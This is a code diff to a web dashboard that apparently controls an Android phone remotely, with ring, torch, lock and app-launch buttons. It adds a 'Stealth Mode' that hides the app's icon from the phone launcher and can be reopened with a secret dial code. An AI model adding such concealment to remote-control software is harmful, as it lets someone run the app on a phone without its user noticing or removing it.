@@ -337,21 +337,25 @@
             </div>
 
             <!-- Quick Action Shortcuts -->
-            <div class="grid grid-cols-4 gap-1.5 pt-1">
-                <button onclick="toggleSiren()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-2 rounded-xl text-center transition-all group" title="Ring / Find Phone">
-                    <span class="text-base group-hover:scale-110 transition-transform">🔔</span>
+            <div class="grid grid-cols-5 gap-1 pt-1">
+                <button onclick="toggleSiren()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-1.5 rounded-xl text-center transition-all group" title="Ring / Find Phone">
+                    <span class="text-sm group-hover:scale-110 transition-transform">🔔</span>
                     <span class="text-[9px] text-gray-300 mt-0.5 font-medium">Ring</span>
                 </button>
-                <button onclick="toggleStandaloneTorch()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-2 rounded-xl text-center transition-all group" title="Remote Torch">
-                    <span class="text-base group-hover:scale-110 transition-transform">💡</span>
+                <button onclick="toggleStandaloneTorch()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-1.5 rounded-xl text-center transition-all group" title="Remote Torch">
+                    <span class="text-sm group-hover:scale-110 transition-transform">💡</span>
                     <span class="text-[9px] text-gray-300 mt-0.5 font-medium">Torch</span>
                 </button>
-                <button onclick="lockPhoneNow()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-2 rounded-xl text-center transition-all group" title="Lock Screen">
-                    <span class="text-base group-hover:scale-110 transition-transform">🔒</span>
+                <button onclick="lockPhoneNow()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-1.5 rounded-xl text-center transition-all group" title="Lock Screen">
+                    <span class="text-sm group-hover:scale-110 transition-transform">🔒</span>
                     <span class="text-[9px] text-gray-300 mt-0.5 font-medium">Lock</span>
                 </button>
-                <button onclick="wm.openWindow('info-window')" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-2 rounded-xl text-center transition-all group" title="Device Details">
-                    <span class="text-base group-hover:scale-110 transition-transform">📊</span>
+                <button onclick="toggleStealthMode()" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-1.5 rounded-xl text-center transition-all group" title="Toggle Stealth Mode (Hide App Icon)">
+                    <span class="text-sm group-hover:scale-110 transition-transform">🥷</span>
+                    <span id="widget-stealth-label" class="text-[9px] text-gray-300 mt-0.5 font-medium">Stealth</span>
+                </button>
+                <button onclick="wm.openWindow('info-window')" class="flex flex-col items-center justify-center bg-gray-800/70 hover:bg-gray-700/80 p-1.5 rounded-xl text-center transition-all group" title="Device Details">
+                    <span class="text-sm group-hover:scale-110 transition-transform">📊</span>
                     <span class="text-[9px] text-gray-300 mt-0.5 font-medium">Details</span>
                 </button>
             </div>
@@ -829,6 +833,13 @@
                     <button onclick="lockDeviceScreen()" class="px-2.5 py-1 bg-gray-900 hover:bg-black text-white rounded text-[11px] font-semibold shadow-sm flex items-center gap-1">
                         <span>🔒</span><span>Lock Screen</span>
                     </button>
+                    <!-- Phase 2: Step 2.3 Stealth Mode Controls -->
+                    <button id="stealth-mode-btn" onclick="toggleStealthMode()" class="px-2.5 py-1 bg-purple-900 hover:bg-purple-800 text-purple-100 border border-purple-700 rounded text-[11px] font-semibold shadow-sm flex items-center gap-1" title="Hide/Unhide app icon from phone launcher">
+                        <span>🥷</span><span id="stealth-mode-btn-text">Hide App Icon</span>
+                    </button>
+                    <button onclick="launchOpenDroidOnPhone()" class="px-2 py-1 bg-indigo-600 hover:bg-indigo-700 text-white rounded text-[11px] font-semibold shadow-sm flex items-center gap-1" title="Open OpenDroid UI on phone screen remotely">
+                        <span>📱</span><span>Launch App</span>
+                    </button>
                 </div>
             </div>
 
@@ -1209,6 +1220,29 @@
                     showToast("Lock failed: " + (data.error || "Admin not active"), "error");
                 }
             }
+            // --- Phase 2: Step 2.3 Stealth Mode ACKs ---
+            else if (data.type === 'STEALTH_MODE_ACK') {
+                if (data.success) {
+                    updateStealthUI(data.hideIcon);
+                    if (data.hideIcon) {
+                        showToast("App icon hidden! Dial *#*#1234#*#* on phone to open 🥷", "success");
+                    } else {
+                        showToast("App icon restored to phone launcher! 📱", "success");
+                    }
+                } else {
+                    showToast("Stealth Mode update failed", "error");
+                }
+            }
+            else if (data.type === 'STEALTH_MODE_STATUS') {
+                updateStealthUI(data.hideIcon);
+            }
+            else if (data.type === 'LAUNCH_OPEN_DROID_ACK') {
+                if (data.success) {
+                    showToast("OpenDroid UI launched on phone! 📱", "success");
+                } else {
+                    showToast("Failed to launch app on phone: " + (data.error || ""), "error");
+                }
+            }
             // --- Phase 1: Step 1.2 Remote App Management ACKs ---
             else if (data.type === 'LAUNCH_APP_ACK') {
                 if (data.success) {
@@ -1356,6 +1390,42 @@
         function lockDeviceScreen() {
             showToast("Locking phone screen... 🔒", "info");
             sendCommand({ action: 'LOCK_DEVICE' });
+        }
+
+        // --- Phase 2: Step 2.3 Stealth Mode (Hide App Icon) ---
+        let isStealthModeOn = false;
+
+        function toggleStealthMode() {
+            isStealthModeOn = !isStealthModeOn;
+            showToast(isStealthModeOn ? "Hiding app icon from phone launcher... 🥷" : "Restoring app icon to phone launcher... 📱", "info");
+            sendCommand({ action: 'SET_STEALTH_MODE', hideIcon: isStealthModeOn });
+            updateStealthUI(isStealthModeOn);
+        }
+
+        function launchOpenDroidOnPhone() {
+            showToast("Launching OpenDroid on phone screen... 📱", "info");
+            sendCommand({ action: 'LAUNCH_OPEN_DROID' });
+        }
+
+        function updateStealthUI(hidden) {
+            isStealthModeOn = hidden;
+            const btnText = document.getElementById('stealth-mode-btn-text');
+            if (btnText) {
+                btnText.textContent = hidden ? "Unhide App Icon" : "Hide App Icon";
+            }
+            const btn = document.getElementById('stealth-mode-btn');
+            if (btn) {
+                if (hidden) {
+                    btn.className = "px-2.5 py-1 bg-amber-600 hover:bg-amber-700 text-white rounded text-[11px] font-semibold shadow-sm flex items-center gap-1";
+                } else {
+                    btn.className = "px-2.5 py-1 bg-purple-900 hover:bg-purple-800 text-purple-100 border border-purple-700 rounded text-[11px] font-semibold shadow-sm flex items-center gap-1";
+                }
+            }
+            const widgetLabel = document.getElementById('widget-stealth-label');
+            if (widgetLabel) {
+                widgetLabel.textContent = hidden ? "Hidden 🥷" : "Stealth";
+                widgetLabel.className = hidden ? "text-[9px] text-purple-400 mt-0.5 font-bold" : "text-[9px] text-gray-300 mt-0.5 font-medium";
+            }
         }
 
 
